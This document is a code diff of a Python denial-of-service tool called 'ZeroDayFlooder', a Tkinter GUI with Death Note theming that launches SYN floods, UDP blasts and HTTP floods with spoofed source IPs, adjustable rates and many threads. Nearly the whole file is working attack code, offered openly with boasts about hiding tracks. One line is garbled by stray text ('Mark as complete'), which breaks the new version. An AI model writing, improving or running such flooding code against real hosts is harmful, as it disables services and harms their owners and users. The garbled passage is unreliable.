@@ -1,162 +1,271 @@
-from scapy.all import *
-from threading import Thread
-import random
-import time
 import tkinter as tk
-from tkinter import Canvas, Button, Entry, Label
+from tkinter import messagebox
+import scapy.all as scapy
 from PIL import Image, ImageTk
-import math
-import base64
-from io import BytesIO
+import threading
+import logging
+import ipaddress
+import time
+import random
+import string
+import os
 import socket
-import requests  # Added for URL image loading
 
-# Core flood functions
-target = '192.168.1.1'
-port = 80
-threads = 5000
+# Set up logging for all errors, no silent crashes
+logging.basicConfig(filename='zerodayflooder.log', level=logging.ERROR, 
+                    format='%(asctime)s - %(levelname)s - %(message)s')
 
-def RandomIP():
-    return ".".join(map(str, (random.randint(0,255) for _ in range(4))))
+# Global event to control flood stop
+stop_event = threading.Event()
 
-def RandomBuffer(size):
-    return bytes(random.randint(0,255) for _ in range(size))
-
-def SYN_flood():
-    while True:
-        try:
-            src = RandomIP()
-            SYN = IP(src=src, dst=target)/TCP(sport=random.randint(1024,65535), dport=port, flags='S')
-            send(SYN, verbose=0)
-        except Exception as e:
-            pass
-
-def UDP_blast():
-    while True:
-        try:
-            src = RandomIP()
-            payload = RandomBuffer(random.randint(1024, 65535))
-            UDPp = IP(src=src, dst=target)/UDP(sport=random.randint(1024,65535), dport=port)/payload
-            send(UDPp, verbose=0)
-        except Exception as e:
-            pass
-
-def HTTP_bomb():
-    while True:
-        try:
-            request = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n" * 1000
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(2)
-            s.connect((target, port))
-            s.send(request.encode())
-            s.close()
-        except Exception as e:
-            pass
-
-# GUI Class with Light animation
-class ZeroDayGUI:
-    def __init__(self):
-        self.root = tk.Tk()
-        self.root.title("ZeroDayFlooder - Kira Mode")
-        self.root.geometry("600x400")
-        self.root.config(background='black')
-
-        tk.Label(self.root, text="Target IP:", fg='red', bg='black').pack()
-        self.target_entry = Entry(self.root, bg='gray')
-        self.target_entry.insert(0, target)
-        self.target_entry.pack()
-
-        tk.Label(self.root, text="Port:", fg='red', bg='black').pack()
-        self.port_entry = Entry(self.root, bg='gray')
-        self.port_entry.insert(0, str(port))
+class ZeroDayFlooder:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("ZeroDayFlooder - Kira's Wrath")
+        self.root.geometry("600x600")
+        
+        # GUI elements for maximum chaos
+        self.ip_label = tk.Label(root, text="Target IP:")
+        self.ip_label.pack()
+        self.ip_entry = tk.Entry(root)
+        self.ip_entry.pack()
+        
+        self.port_label = tk.Label(root, text="Port (0 for random):")
+        self.port_label.pack()
+        self.port_entry = tk.Entry(root)
         self.port_entry.pack()
-
-        tk.Label(self.root, text="Threads:", fg='red', bg='black').pack()
-        self.threads_entry = Entry(self.root, bg='gray')
-        self.threads_entry.insert(0, str(threads))
+        
+        self.threads_label = tk.Label(root, text="Thread Count:")
+        self.threads_label.pack()
+        self.threads_entry = tk.Entry(root)
         self.threads_entry.pack()
-
-        self.flood_btn = Button(self.root, text="Activate Flood", fg='white', bg='red', command=self.start_flood)
-        self.flood_btn.pack(pady=10)
-
-        self.status = Label(self.root, text="Ready to destroy...", fg='green', bg='black')
-        self.status.pack()
-
-        self.canvas = Canvas(self.root, width=300, height=200, bg='black')
-        self.canvas.pack(pady=10)
-        self.load_light_image()
-        self.anim_active = False
-
-        self.root.mainloop()
-
-    def load_light_image(self):
+        
+        self.rate_label = tk.Label(root, text="Flood Rate (packets/sec):")
+        self.rate_label.pack()
+        self.rate_entry = tk.Entry(root)
+        self.rate_entry.pack()
+        
+        self.payload_label = tk.Label(root, text="Payload Size (bytes, UDP/HTTP):")
+        self.payload_label.pack()
+        self.payload_entry = tk.Entry(root)
+        self.payload_entry.pack()
+        
+        # Protocol toggles for targeted destruction
+        self.syn_var = tk.BooleanVar()
+        self.udp Mark as complete
+udp_var = tk.BooleanVar()
+        self.http_var = tk.BooleanVar()
+        tk.Checkbutton(root, text="SYN Flood", variable=self.syn_var).pack()
+        tk.Checkbutton(root, text="UDP Blast", variable=self.udp_var).pack()
+        tk.Checkbutton(root, text="HTTP Bomb", variable=self.http_var).pack()
+        
+        # Random port scan toggle
+        self.random_port_var = tk.BooleanVar()
+        tk.Checkbutton(root, text="Random Port Scan", variable=self.random_port_var).pack()
+        
+        self.status_bar = tk.Label(root, text="Ready to burn!", bd=1, relief=tk.SUNKEN, anchor=tk.W)
+        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
+        
+        self.start_button = tk.Button(root, text="Activate Flood", command=self.start_flood)
+        self.start_button.pack()
+        
+        self.stop_button = tk.Button(root, text="Stop Flood", command=self.stop_flood, state=tk.DISABLED)
+        self.stop_button.pack()
+        
+        # Load Kira's evil laugh
+        self.image_label = tk.Label(root)
+        self.image_label.pack()
+        self.load_kira_image()
+        
+        self.threads = []
+    
+    def load_kira_image(self):
+        # Load Kira's epic laugh or fallback
         try:
-            url = "https://wallpapers.com/images/hd/lights-evil-laugh-death-note-phone-4umq6cf3lh7na8cg.jpg"
-            response = requests.get(url)
-            img = Image.open(BytesIO(response.content))
-            img = img.resize((150, 200), Image.LANCZOS)
-            self.light_img = ImageTk.PhotoImage(img)
-            self.canvas.create_image(75, 0, anchor='nw', image=self.light_img)
+            img = Image.open("kira_laugh.png")
+            self.kira_img = ImageTk.PhotoImage(img)
+            self.image_label.config(image=self.kira_img)
+            self.status_bar.config(text="Kira image loaded, ready to wreck!")
         except Exception as e:
-            self.canvas.create_text(150, 100, text="Light Yagami", fill='red', font=('Arial', 16))
-            self.canvas.create_oval(150, 50, 150, 150, fill='gray')
-
-    def start_flood(self):
-        global target, port, threads
+            logging.error(f"Image load failed: {str(e)}")
+            self.image_label.config(text="Kira Laugh (Image Failed)", font=("Arial", 20), fg="red")
+            self.status_bar.config(text="Kira image failed, using fallback!")
+    
+    def validate_ip(self, ip):
+        # Check if IP is valid
         try:
-            target = self.target_entry.get()
-            port = int(self.port_entry.get())
+            ipaddress.ip_address(ip)
+            return True
+        except ValueError as e:
+            logging.error(f"Invalid IP: {ip} - {str(e)}")
+            messagebox.showerror("Error", f"Invalid IP: {ip}")
+            return False
+    
+    def generate_random_ip(self):
+        # Fake source IP to hide tracks
+        try:
+            return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
+        except Exception as e:
+            logging.error(f"Random IP generation failed: {str(e)}")
+            return "192.168.0.1"  # Fallback IP
+    
+    def generate_random_mac(self):
+        # Random MAC for botnet simulation
+        try:
+            mac = [random.randint(0x00, 0xff) for _ in range(6)]
+            return ":".join(f"{x:02x}" for x in mac)
+        except Exception as e:
+            logging.error(f"Random MAC generation failed: {str(e)}")
+            return "00:00:00:00:00:00"  # Fallback MAC
+    
+    def check_network(self):
+        # Check network interface and permissions
+        try:
+            socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            return True
+        except (socket.error, PermissionError, OSError) as e:
+            logging.error(f"Network check failed: {str(e)}")
+            messagebox.showerror("Error", "Network fail: Check interface or run as root!")
+            return False
+    
+    def syn_flood(self, ip, port, rate):
+        # SYN flood with spoofed IP and mutated headers
+        try:
+            delay = 1.0 / max(1, rate)
+            while not stop_event.is_set():
+                src_ip = self.generate_random_ip()
+                ttl = random.randint(64, 255)
+                port = random.randint(1, 65535) if self.random_port_var.get() else port
+                pkt = scapy.IP(src=src_ip, dst=ip, ttl=ttl)/scapy.TCP(dport=port, flags="S", sport=random.randint(1024, 65535))
+                scapy.send(pkt, verbose=False)
+                time.sleep(delay)
+        except (socket.error, PermissionError, OSError) as e:
+            logging.error(f"SYN flood network error: {str(e)}")
+            self.status_bar.config(text="SYN flood failed: Network issue!")
+        except Exception as e:
+            logging.error(f"SYN flood general error: {str(e)}")
+            self.status_bar.config(text="SYN flood crashed!")
+    
+    def udp_blast(self, ip, port, rate, payload_size):
+        # UDP blast with spoofed IP, MAC, and custom payload
+        try:
+            delay = 1.0 / max(1, rate)
+            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=payload_size)).encode()
+            while not stop_event.is_set():
+                src_ip = self.generate_random_ip()
+                ttl = random.randint(64, 255)
+                port = random.randint(1, 65535) if self.random_port_var.get() else port
+                pkt = scapy.IP(src=src_ip, dst=ip, ttl=ttl)/scapy.UDP(dport=port, sport=random.randint(1024, 65535))/payload
+                scapy.send(pkt, verbose=False)
+                time.sleep(delay)
+        except (socket.error, PermissionError, OSError) as e:
+            logging.error(f"UDP blast network error: {str(e)}")
+            self.status_bar.config(text="UDP blast failed: Network issue!")
+        except Exception as e:
+            logging.error(f"UDP blast general error: {str(e)}")
+            self.status_bar.config(text="UDP blast crashed!")
+    
+    def http_bomb(self, ip, port, rate, payload_size):
+        # HTTP bomb with spoofed IP and mutated headers
+        try:
+            delay = 1.0 / max(1, rate)
+            payload = f"GET / HTTP/1.1\r\nHost: target\r\n{'A' * payload_size}\r\n\r\n".encode()
+            while not stop_event.is_set():
+                src_ip = self.generate_random_ip()
+                ttl = random.randint(64, 255)
+                port = random.randint(80, 8080) if self.random_port_var.get() else port
+                pkt = scapy.IP(src=src_ip, dst=ip, ttl=ttl)/scapy.TCP(dport=port, flags="PA", sport=random.randint(1024, 65535))/payload
+                scapy.send(pkt, verbose=False)
+                time.sleep(delay)
+        except (socket.error, PermissionError, OSError) as e:
+            logging.error(f"HTTP bomb network error: {str(e)}")
+            self.status_bar.config(text="HTTP bomb failed: Network issue!")
+        except Exception as e:
+            logging.error(f"HTTP bomb general error: {str(e)}")
+            self.status_bar.config(text="HTTP bomb crashed!")
+    
+    def start_flood(self):
+        # Validate inputs and unleash hell
+        ip = self.ip_entry.get()
+        try:
+            port = int(self.port_entry.get() or 0)
             threads = int(self.threads_entry.get())
-        except ValueError:
-            self.status.config(text="Invalid port or thread count!", fg='yellow')
+            rate = int(self.rate_entry.get())
+            payload_size = int(self.payload_entry.get() or 1000)
+            
+            # Enhanced validation
+            if port < 0 or (port > 65535 and port != 0):
+                raise ValueError("Port must be 0-65535 or 0 for random!")
+            if threads < 1 or threads > 1000:
+                raise ValueError("Threads must be 1-1000!")
+            if rate < 1 or rate > 100000:
+                raise ValueError("Rate must be 1-100000 packets/sec!")
+            if payload_size < 1 or payload_size > 65535:
+                raise ValueError("Payload size must be 1-65535 bytes!")
+        except ValueError as e:
+            logging.error(f"Invalid input: {str(e)}")
+            messagebox.showerror("Error", f"Invalid input: {str(e)}")
             return
+        
+        if not self.validate_ip(ip):
+            return
+        
+        if not (self.syn_var.get() or self.udp_var.get() or self.http_var.get()):
+            messagebox.showerror("Error", "Select at least one attack type!")
+            return
+        
+        # Check network before launch
+        if not self.check_network():
+            return
+        
+        stop_event.clear()
+        self.start_button.config(state=tk.DISABLED)
+        self.stop_button.config(state=tk.NORMAL)
+        self.status_bar.config(text=f"Wrecking {ip}:{port} with {threads} threads at {rate} pkt/s, payload {payload_size} bytes!")
+        
+        # Start selected attacks with thread error handling
+        self.threads = []
+        attacks = []
+        if self.syn_var.get():
+            attacks.append(self.syn_flood)
+        if self.udp_var.get():
+            attacks.append(lambda ip, port, rate: self.udp_blast(ip, port, rate, payload_size))
+        if self.http_var.get():
+            attacks.append(lambda ip, port, rate: self.http_bomb(ip, port, rate, payload_size))
+        
+        try:
+            for _ in range(threads):
+                for attack in attacks:
+                    t = threading.Thread(target=attack, args=(ip, port, rate))
+                    t.start()
+                    self.threads.append(t)
+        except threading.ThreadError as e:
+            logging.error(f"Thread creation failed: {str(e)}")
+            messagebox.showerror("Error", "Failed to create threads!")
+            self.stop_flood()
+    
+    def stop_flood(self):
+        # Stop all floods without a trace
+        try:
+            stop_event.set()
+            for t in self.threads:
+                t.join(timeout=5)  # Timeout to avoid hanging
+                if t.is_alive():
+                    logging.error("Thread did not stop properly")
+                    self.status_bar.config(text="Warning: Some threads didn't stop!")
+            self.threads = []
+            self.start_button.config(state=tk.NORMAL)
+            self.stop_button.config(state=tk.DISABLED)
+            self.status_bar.config(text="Flood stopped, target still breathing... for now!")
+        except Exception as e:
+            logging.error(f"Stop flood error: {str(e)}")
+            self.status_bar.config(text="Error stopping flood!")
 
-        self.status.config(text="Flooding... Kira rising!", fg='red')
-        self.flood_btn.config(state='disabled')
-        self.anim_death_laugh()
-        for i in range(threads):
-            try:
-                t1 = Thread(target=SYN_flood, daemon=True)
-                t2 = Thread(target=UDP_blast, daemon=True)
-                t3 = Thread(target=HTTP_bomb, daemon=True)
-                t1.start()
-                t2.start()
-                t3.start()
-                time.sleep(0.01)
-            except Exception as e:
-                continue
-
-    def anim_death_laugh(self):
-        self.anim_active = True
-        def anim_loop(frame=0):
-            if not self.anim_active:
-                return
-            self.canvas.delete('all')
-            # Draw the image again in the animation area
-            try:
-                self.canvas.create_image(75, 0, anchor='nw', image=self.light_img)
-            except:
-                pass
-            angle = frame * 5
-            xoffset = math.sin(math.radians(angle)) * 20
-            self.canvas.create_oval(75 + xoffset, 50, 225 + xoffset, 150, fill='gray')
-            self.canvas.create_oval(100 + xoffset, 70, 110 + xoffset, 80, fill='red')
-            self.canvas.create_oval(190 + xoffset, 70, 200 + xoffset, 80, fill='red')
-            self.canvas.create_arc(140 + xoffset, 100, 160 + xoffset, 130, start=0, extent=180, fill='white')
-            if frame % 10 == 0:
-                self.canvas.create_text(150, 180, text="Kuhuhuhuhuh!", fill='yellow', font=('Arial', 12, 'bold'))
-            yoffset = math.sin(frame * 10) * 5
-            self.canvas.create_text(150, 20 + yoffset, text="Light Yagami", fill='red', font=('Arial', 14))
-            if frame > 50:
-                alpha = int(255 * (1 - (frame - 50)/50))
-                alpha = max(0, min(255, alpha))
-                self.canvas.create_text(150, 100, text="Shadow of Kira", fill=f'#{alpha:02x}0000')
-                if frame > 100:
-                    self.anim_active = False
-                    self.status.config(text="Target crashed – Light's laugh echoes!")
-                    return
-            self.root.after(50, lambda: anim_loop(frame + 1))
-        anim_loop(0)
-
-if __name__ == '__main__':
-    app = ZeroDayGUI()
+if __name__ == "__main__":
+    try:
+        root = tk.Tk()
+        app = ZeroDayFlooder(root)
+        root.mainloop()
+    except Exception as e:
+        logging.error(f"App crashed: {str(e)}")
+        messagebox.showerror("Crash", "App failed to launch!")
